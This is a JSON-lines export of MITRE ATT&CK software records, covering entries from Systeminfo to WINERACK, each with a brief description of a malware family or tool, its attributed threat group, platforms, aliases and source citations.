{"ID":"S0096","name":"Systeminfo","description":"[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)","url":"https://attack.mitre.org/software/S0096","created":"31 May 2017","last modified":"07 March 2023","version":"1.2","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: FireEye admin@338),(Citation: Kaspersky Turla),(Citation: DFIR Phosphorus November 2021),(Citation: NCC Group APT15 Alive and Strong),(Citation: Symantec Orangeworm April 2018),(Citation: CISA SoreFang July 2016),(Citation: Trend Micro DRBControl February 2020),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: FireEye APT34 Dec 2017),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Honeybee),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: TechNet Systeminfo)"}
{"ID":"S0098","name":"T9000","description":"[T9000](https://attack.mitre.org/software/S0098) is a backdoor that is a newer variant of the T5000 malware family, also known as Plat1. Its primary function is to gather information about the victim. It has been used in multiple targeted attacks against U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto T9000 Feb 2016)","url":"https://attack.mitre.org/software/S0098","created":"31 May 2017","last modified":"31 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Palo Alto T9000 Feb 2016)"}
{"ID":"S0586","name":"TAINTEDSCRIBE","description":"[TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) is a fully-featured beaconing implant integrated with command modules used by [Lazarus Group](https://attack.mitre.org/groups/G0032). It was first reported in May 2020.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020)","url":"https://attack.mitre.org/software/S0586","created":"05 March 2021","last modified":"26 April 2021","version":"1.0","contributors":"Daniyal Naeem, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),,(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020)"}
{"ID":"S0164","name":"TDTESS","description":"[TDTESS](https://attack.mitre.org/software/S0164) is a 64-bit .NET binary backdoor used by [CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July 2017)","url":"https://attack.mitre.org/software/S0164","created":"16 January 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ClearSky Wilted Tulip July 2017),,(Citation: ClearSky Wilted Tulip July 2017)"}
{"ID":"S0560","name":"TEARDROP","description":"[TEARDROP](https://attack.mitre.org/software/S0560) is a memory-only dropper that was discovered on some victim machines during investigations related to the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024). It was likely used by [APT29](https://attack.mitre.org/groups/G0016) since at least May 2020.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Microsoft Deep Dive Solorigate January 2021)","url":"https://attack.mitre.org/software/S0560","created":"06 January 2021","last modified":"27 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: MSTIC NOBELIUM May 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CheckPoint Sunburst & Teardrop December 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Check Point Sunburst Teardrop December 2020)"}
{"ID":"S0146","name":"TEXTMATE","description":"[TEXTMATE](https://attack.mitre.org/software/S0146) is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with [POWERSOURCE](https://attack.mitre.org/software/S0145) in February 2017. (Citation: FireEye FIN7 March 2017)","url":"https://attack.mitre.org/software/S0146","created":"31 May 2017","last modified":"20 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":"DNSMessenger","type":"malware","relationship citations":"(Citation: FireEye FIN7 March 2017),,(Citation: Cisco DNSMessenger March 2017),(Citation: FireEye FIN7 March 2017)"}
{"ID":"S0131","name":"TINYTYPHON","description":"[TINYTYPHON](https://attack.mitre.org/software/S0131) is a backdoor  that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm. (Citation: Forcepoint Monsoon)","url":"https://attack.mitre.org/software/S0131","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: Forcepoint Monsoon),,(Citation: Forcepoint Monsoon)"}
{"ID":"S0436","name":"TSCookie","description":"[TSCookie](https://attack.mitre.org/software/S0436) is a remote access tool (RAT) that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) in campaigns against Japanese targets.(Citation: JPCert TSCookie March 2018)(Citation: JPCert BlackTech Malware September 2019). [TSCookie](https://attack.mitre.org/software/S0436) has been referred to as [PLEAD](https://attack.mitre.org/software/S0435) though more recent reporting indicates a separation between the two.(Citation: JPCert PLEAD Downloader June 2018)(Citation: JPCert BlackTech Malware September 2019)","url":"https://attack.mitre.org/software/S0436","created":"06 May 2020","last modified":"15 April 2022","version":"1.0","contributors":"Tatsuya Daitoku, Cyber Defense Institute, Inc.","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: JPCert TSCookie March 2018),,(Citation: JPCert TSCookie March 2018),(Citation: JPCert BlackTech Malware September 2019)"}
{"ID":"S0199","name":"TURNEDUP","description":"[TURNEDUP](https://attack.mitre.org/software/S0199) is a non-public backdoor. It has been dropped by [APT33](https://attack.mitre.org/groups/G0064)'s [StoneDrill](https://attack.mitre.org/software/S0380) malware. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)","url":"https://attack.mitre.org/software/S0199","created":"18 April 2018","last modified":"09 February 2021","version":"1.1","contributors":"Christiaan Beek, @ChristiaanBeek; Ryan Becwar","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT33 Sept 2017),(Citation: Symantec Elfin Mar 2019),(Citation: FireEye APT33 Webinar Sept 2017),,(Citation: FireEye APT33 Sept 2017),(Citation: CyberBit Early Bird Apr 2018)"}
{"ID":"S0263","name":"TYPEFRAME","description":"[TYPEFRAME](https://attack.mitre.org/software/S0263) is a remote access tool that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT TYPEFRAME June 2018)","url":"https://attack.mitre.org/software/S0263","created":"17 October 2018","last modified":"26 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT TYPEFRAME June 2018),,(Citation: US-CERT TYPEFRAME June 2018)"}
{"ID":"S0011","name":"Taidoor","description":"[Taidoor](https://attack.mitre.org/software/S0011) is a remote access trojan (RAT) that has been used by Chinese government cyber actors to maintain access on victim networks.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Taidoor](https://attack.mitre.org/software/S0011) has primarily been used against Taiwanese government organizations since at least 2010.(Citation: TrendMicro Taidoor)","url":"https://attack.mitre.org/software/S0011","created":"31 May 2017","last modified":"15 October 2021","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: TrendMicro Taidoor)"}
{"ID":"S0467","name":"TajMahal","description":"[TajMahal](https://attack.mitre.org/software/S0467) is a multifunctional spying framework that has been in use since at least 2014. [TajMahal](https://attack.mitre.org/software/S0467) is comprised of two separate packages, named Tokyo and Yokohama, and can deploy up to 80 plugins.(Citation: Kaspersky TajMahal April 2019)","url":"https://attack.mitre.org/software/S0467","created":"08 June 2020","last modified":"15 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Kaspersky TajMahal April 2019)"}
{"ID":"S1011","name":"Tarrask","description":"[Tarrask](https://attack.mitre.org/software/S1011) is malware that has been used by [HAFNIUM](https://attack.mitre.org/groups/G0125) since at least August 2021. [Tarrask](https://attack.mitre.org/software/S1011) was designed to evade digital defenses and maintain persistence by generating concealed scheduled tasks.(Citation: Tarrask scheduled task)","url":"https://attack.mitre.org/software/S1011","created":"01 June 2022","last modified":"18 October 2022","version":"1.0","contributors":"Sittikorn Sangrattanapitak","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Tarrask scheduled task),,(Citation: Tarrask scheduled task)"}
{"ID":"S0057","name":"Tasklist","description":"The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)","url":"https://attack.mitre.org/software/S0057","created":"31 May 2017","last modified":"12 October 2022","version":"1.1","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":"(Citation: Kaspersky Turla),(Citation: TrendMicro EarthLusca 2022),(Citation: Alperovitch 2014),(Citation: Mandiant APT1),(Citation: NCC Group APT15 Alive and Strong),(Citation: Palo Alto OilRig May 2016),(Citation: CISA SoreFang July 2016),(Citation: Trend Micro DRBControl February 2020),(Citation: FireEye APT34 Dec 2017),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Honeybee),(Citation: Microsoft Tasklist)"}
{"ID":"S0595","name":"ThiefQuest","description":"[ThiefQuest](https://attack.mitre.org/software/S0595) is a virus, data stealer, and wiper that presents itself as ransomware targeting macOS systems. [ThiefQuest](https://attack.mitre.org/software/S0595) was first seen in 2020 distributed via trojanized pirated versions of popular macOS software on Russian forums sharing torrent links.(Citation: Reed thiefquest fake ransom) Even though [ThiefQuest](https://attack.mitre.org/software/S0595) presents itself as ransomware, since the dynamically generated encryption key is never sent to the attacker it may be more appropriately thought of as a form of wiper malware.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis)","url":"https://attack.mitre.org/software/S0595","created":"19 March 2021","last modified":"16 April 2022","version":"1.2","contributors":null,"platforms":"macOS","aliases":"EvilQuest, MacRansom.K","type":"malware","relationship citations":",,(Citation: wardle evilquest parti),(Citation: reed thiefquest ransomware analysis),(Citation: Trendmicro Evolving ThiefQuest 2020),(Citation: wardle evilquest partii)"}
{"ID":"S0665","name":"ThreatNeedle","description":"[ThreatNeedle](https://attack.mitre.org/software/S0665) is a backdoor that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2019 to target cryptocurrency, defense, and mobile gaming organizations.  It is considered to be an advanced cluster of [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Manuscrypt (a.k.a. NukeSped) malware family.(Citation: Kaspersky ThreatNeedle Feb 2021)","url":"https://attack.mitre.org/software/S0665","created":"30 November 2021","last modified":"26 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky ThreatNeedle Feb 2021),,(Citation: Kaspersky ThreatNeedle Feb 2021)"}
{"ID":"S0668","name":"TinyTurla","description":"[TinyTurla](https://attack.mitre.org/software/S0668) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) against targets in the US, Germany, and Afghanistan since at least 2020.(Citation: Talos TinyTurla September 2021)","url":"https://attack.mitre.org/software/S0668","created":"02 December 2021","last modified":"26 March 2023","version":"1.1","contributors":"Kyaw Pyiyt Htet, @KyawPyiytHtet; Massimiliano Romano, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Talos TinyTurla September 2021),,(Citation: Talos TinyTurla September 2021)"}
{"ID":"S0004","name":"TinyZBot","description":"[TinyZBot](https://attack.mitre.org/software/S0004) is a bot written in C# that was developed by [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver)","url":"https://attack.mitre.org/software/S0004","created":"31 May 2017","last modified":"22 July 2022","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Cylance Cleaver),,(Citation: Cylance Cleaver)"}
{"ID":"S0671","name":"Tomiris","description":"[Tomiris](https://attack.mitre.org/software/S0671) is a backdoor written in Go that continuously queries its C2 server for executables to download and execute on a victim system. It was first reported in September 2021 during an investigation of a successful DNS hijacking campaign against a Commonwealth of Independent States (CIS) member. Security researchers assess there are similarities between [Tomiris](https://attack.mitre.org/software/S0671) and [GoldMax](https://attack.mitre.org/software/S0588).(Citation: Kaspersky Tomiris Sep 2021)","url":"https://attack.mitre.org/software/S0671","created":"29 December 2021","last modified":"15 April 2022","version":"1.0","contributors":"Craig Smith, BT Security","platforms":null,"aliases":null,"type":"malware","relationship citations":",,(Citation: Kaspersky Tomiris Sep 2021)"}
{"ID":"S0183","name":"Tor","description":"[Tor](https://attack.mitre.org/software/S0183) is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information. [Tor](https://attack.mitre.org/software/S0183) utilizes \"Onion Routing,\" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. (Citation: Dingledine Tor The Second-Generation Onion Router)","url":"https://attack.mitre.org/software/S0183","created":"16 January 2018","last modified":"05 October 2022","version":"1.2","contributors":null,"platforms":"Linux, Windows, macOS","aliases":null,"type":"tool","relationship citations":"(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Mandiant No Easy Breach),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FoxIT Wocao December 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Dingledine Tor The Second-Generation Onion Router)"}
{"ID":"S0678","name":"Torisma","description":"[Torisma](https://attack.mitre.org/software/S0678) is a second stage implant designed for specialized monitoring that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [Torisma](https://attack.mitre.org/software/S0678) was discovered during an investigation into the 2020 Operation North Star campaign that targeted the defense sector.(Citation: McAfee Lazarus Nov 2020)","url":"https://attack.mitre.org/software/S0678","created":"01 February 2022","last modified":"21 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",(Citation: McAfee Lazarus Jul 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: McAfee Lazarus Nov 2020)"}
{"ID":"S0682","name":"TrailBlazer","description":"[TrailBlazer](https://attack.mitre.org/software/S0682) is a modular malware that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2019.(Citation: CrowdStrike StellarParticle January 2022)","url":"https://attack.mitre.org/software/S0682","created":"08 February 2022","last modified":"27 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CrowdStrike StellarParticle January 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: CrowdStrike StellarParticle January 2022)"}
{"ID":"S0266","name":"TrickBot","description":"[TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that first emerged in September 2016 as a possible successor to [Dyre](https://attack.mitre.org/software/S0024). [TrickBot](https://attack.mitre.org/software/S0266) was developed and initially used by [Wizard Spider](https://attack.mitre.org/groups/G0102) for targeting banking sites in North America, Australia, and throughout Europe; it has since been used against all sectors worldwide as part of \"big game hunting\" ransomware campaigns.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: IBM TrickBot Nov 2016)(Citation: CrowdStrike Wizard Spider October 2020)","url":"https://attack.mitre.org/software/S0266","created":"17 October 2018","last modified":"23 February 2023","version":"2.0","contributors":"Cybereason Nocturnus, @nocturnus; Daniyal Naeem, BT Security; FS-ISAC; Omkar Gudhate","platforms":"Windows","aliases":"TSPY_TRICKLOAD, Totbrick","type":"malware","relationship citations":"(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Sophos New Ryuk Attack October 2020),(Citation: CrowdStrike Grim Spider May 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: IBM TA505 April 2020),(Citation: Proofpoint TA505 Sep 2017),,(Citation: Fidelis TrickBot Oct 2016),(Citation: Fortinet TrickBot),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Eclypsium Trickboot December 2020),(Citation: ESET Trickbot Oct 2020),(Citation: Bitdefender Trickbot March 2020),(Citation: IBM TrickBot Nov 2016),(Citation: Microsoft Totbrick Oct 2017),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Cyberreason Anchor December 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: Trickbot VNC module July 2021),(Citation: Joe Sec Trickbot),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021)"}
{"ID":"S0094","name":"Trojan.Karagany","description":"[Trojan.Karagany](https://attack.mitre.org/software/S0094) is a modular remote access tool used for recon and linked to [Dragonfly](https://attack.mitre.org/groups/G0035). The source code for [Trojan.Karagany](https://attack.mitre.org/software/S0094) originated from Dream Loader malware which was leaked in 2010 and sold on underground forums. (Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019)(Citation: Dragos DYMALLOY )","url":"https://attack.mitre.org/software/S0094","created":"31 May 2017","last modified":"19 April 2022","version":"3.0","contributors":null,"platforms":"Windows","aliases":"Karagany, xFrost","type":"malware","relationship citations":"(Citation: Gigamon Berserk Bear October 2021),(Citation: Secureworks Karagany July 2019),(Citation: Symantec Dragonfly),,(Citation: Secureworks Karagany July 2019),(Citation: Symantec Dragonfly)"}
{"ID":"S0001","name":"Trojan.Mebromi","description":"[Trojan.Mebromi](https://attack.mitre.org/software/S0001) is BIOS-level malware that takes control of the victim before MBR. (Citation: Ge 2011)","url":"https://attack.mitre.org/software/S0001","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Ge 2011)"}
{"ID":"S0178","name":"Truvasys","description":"[Truvasys](https://attack.mitre.org/software/S0178) is first-stage malware that has been used by [PROMETHIUM](https://attack.mitre.org/groups/G0056). It is a collection of modules written in the Delphi programming language. (Citation: Microsoft Win Defender Truvasys Sep 2017) (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21)","url":"https://attack.mitre.org/software/S0178","created":"16 January 2018","last modified":"18 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft SIR Vol 21),(Citation: Microsoft NEODYMIUM Dec 2016),,(Citation: Microsoft Win Defender Truvasys Sep 2017)"}
{"ID":"S0647","name":"Turian","description":"[Turian](https://attack.mitre.org/software/S0647) is a backdoor that has been used by [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) to target Ministries of Foreign Affairs, telecommunication companies, and charities in Africa, Europe, the Middle East, and Asia. First reported in 2021, [Turian](https://attack.mitre.org/software/S0647) is likely related to Quarian, an older backdoor that was last observed being used in 2013 against diplomatic targets in Syria and the United States.(Citation: ESET BackdoorDiplomacy Jun 2021)","url":"https://attack.mitre.org/software/S0647","created":"21 September 2021","last modified":"18 October 2021","version":"1.0","contributors":"Zaw Min Htun, @Z3TAE","platforms":"Linux, Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET BackdoorDiplomacy Jun 2021),,(Citation: ESET BackdoorDiplomacy Jun 2021)"}
{"ID":"S0116","name":"UACMe","description":"[UACMe](https://attack.mitre.org/software/S0116) is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. (Citation: Github UACMe)","url":"https://attack.mitre.org/software/S0116","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"tool","relationship citations":",,(Citation: Github UACMe)"}
{"ID":"S0333","name":"UBoatRAT","description":"[UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)","url":"https://attack.mitre.org/software/S0333","created":"29 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: PaloAlto UBoatRAT Nov 2017)"}
{"ID":"S0275","name":"UPPERCUT","description":"[UPPERCUT](https://attack.mitre.org/software/S0275) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018)","url":"https://attack.mitre.org/software/S0275","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"ANEL","type":"malware","relationship citations":"(Citation: FireEye APT10 Sept 2018),,(Citation: FireEye APT10 Sept 2018)"}
{"ID":"S0136","name":"USBStealer","description":"[USBStealer](https://attack.mitre.org/software/S0136) is malware that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with [ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer 2014) (Citation: Kaspersky Sofacy)","url":"https://attack.mitre.org/software/S0136","created":"31 May 2017","last modified":"19 April 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":"USB Stealer, Win32/USBStealer","type":"malware","relationship citations":"(Citation: ESET Sednit Part 3),,(Citation: Kaspersky Sofacy),(Citation: ESET Sednit USBStealer 2014)"}
{"ID":"S0452","name":"USBferry","description":"[USBferry](https://attack.mitre.org/software/S0452) is an information stealing malware and has been used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) in targeted attacks against Taiwanese and Philippine air-gapped military environments. [USBferry](https://attack.mitre.org/software/S0452) shares an overlapping codebase with [YAHOYAH](https://attack.mitre.org/software/S0388), though it has several features which makes it a distinct piece of malware.(Citation: TrendMicro Tropic Trooper May 2020)","url":"https://attack.mitre.org/software/S0452","created":"20 May 2020","last modified":"16 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: TrendMicro Tropic Trooper May 2020),,(Citation: TrendMicro Tropic Trooper May 2020)"}
{"ID":"S0221","name":"Umbreon","description":"A Linux rootkit that provides backdoor access and hides from defenders.","url":"https://attack.mitre.org/software/S0221","created":"18 April 2018","last modified":"01 July 2020","version":"1.1","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: Umbreon Trend Micro)"}
{"ID":"S0130","name":"Unknown Logger","description":"[Unknown Logger](https://attack.mitre.org/software/S0130) is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign. (Citation: Forcepoint Monsoon)","url":"https://attack.mitre.org/software/S0130","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Forcepoint Monsoon),,(Citation: Forcepoint Monsoon)"}
{"ID":"S0022","name":"Uroburos","description":"[Uroburos](https://attack.mitre.org/software/S0022) is a rootkit used by [Turla](https://attack.mitre.org/groups/G0010). (Citation: Kaspersky Turla)","url":"https://attack.mitre.org/software/S0022","created":"31 May 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Turla),,(Citation: Kaspersky Turla),(Citation: Symantec Waterbug)"}
{"ID":"S0386","name":"Ursnif","description":"[Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, and malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)","url":"https://attack.mitre.org/software/S0386","created":"04 June 2019","last modified":"22 March 2023","version":"1.4","contributors":null,"platforms":"Windows","aliases":"Dreambot, Gozi-ISFB, PE_URSNIF","type":"malware","relationship citations":"(Citation: Secureworks GOLD CABIN),(Citation: Unit 42 TA551 Jan 2021),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Valak May 2020),,(Citation: ProofPoint Ursnif Aug 2016),(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye Ursnif Nov 2017),(Citation: NJCCIC Ursnif Sept 2016),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: Bromium Ursnif Mar 2017),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: TrendMicro PE_URSNIF.A2)"}
{"ID":"S0442","name":"VBShower","description":"[VBShower](https://attack.mitre.org/software/S0442) is a backdoor that has been used by [Inception](https://attack.mitre.org/groups/G0100) since at least 2019. [VBShower](https://attack.mitre.org/software/S0442) has been used as a downloader for second stage payloads, including [PowerShower](https://attack.mitre.org/software/S0441).(Citation: Kaspersky Cloud Atlas August 2019)","url":"https://attack.mitre.org/software/S0442","created":"08 May 2020","last modified":"12 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky Cloud Atlas August 2019),,(Citation: Kaspersky Cloud Atlas August 2019)"}
{"ID":"S0257","name":"VERMIN","description":"[VERMIN](https://attack.mitre.org/software/S0257) is a remote access tool written in the Microsoft .NET framework. It is mostly composed of original code, but also has some open source code. (Citation: Unit 42 VERMIN Jan 2018)","url":"https://attack.mitre.org/software/S0257","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit 42 VERMIN Jan 2018)"}
{"ID":"S0476","name":"Valak","description":"[Valak](https://attack.mitre.org/software/S0476) is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)","url":"https://attack.mitre.org/software/S0476","created":"19 June 2020","last modified":"24 March 2023","version":"1.3","contributors":"Cybereason Nocturnus, @nocturnus","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Secureworks GOLD CABIN),(Citation: Unit 42 TA551 Jan 2021),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Valak May 2020),,(Citation: SentinelOne Valak June 2020),(Citation: Unit 42 Valak July 2020),(Citation: Cybereason Valak May 2020)"}
{"ID":"S0636","name":"VaporRage","description":"[VaporRage](https://attack.mitre.org/software/S0636) is a shellcode downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)","url":"https://attack.mitre.org/software/S0636","created":"04 August 2021","last modified":"04 August 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: MSTIC Nobelium Toolset May 2021),,(Citation: MSTIC Nobelium Toolset May 2021)"}
{"ID":"S0207","name":"Vasport","description":"[Vasport](https://attack.mitre.org/software/S0207) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport May 2012)","url":"https://attack.mitre.org/software/S0207","created":"18 April 2018","last modified":"06 January 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Vasport May 2012)"}
{"ID":"S0180","name":"Volgmer","description":"[Volgmer](https://attack.mitre.org/software/S0180) is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing. (Citation: US-CERT Volgmer Nov 2017)","url":"https://attack.mitre.org/software/S0180","created":"16 January 2018","last modified":"26 March 2023","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: US-CERT Volgmer Nov 2017),,(Citation: Symantec Volgmer Aug 2014),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: US-CERT Volgmer Nov 2017)"}
{"ID":"S0109","name":"WEBC2","description":"[WEBC2](https://attack.mitre.org/software/S0109) is a family of backdoor malware used by [APT1](https://attack.mitre.org/groups/G0006) as early as July 2006. [WEBC2](https://attack.mitre.org/software/S0109) backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server. (Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0109","created":"31 May 2017","last modified":"25 August 2020","version":"2.0","contributors":"Wes Hurd","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1 Appendix),(Citation: Mandiant APT1)"}
{"ID":"S0155","name":"WINDSHIELD","description":"[WINDSHIELD](https://attack.mitre.org/software/S0155) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)","url":"https://attack.mitre.org/software/S0155","created":"14 December 2017","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT32 May 2017),,(Citation: FireEye APT32 May 2017)"}
{"ID":"S0219","name":"WINERACK","description":"[WINERACK](https://attack.mitre.org/software/S0219) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0219","created":"18 April 2018","last modified":"17 October 2018","version":"1.0","contributors":null,"platforms":null,"aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
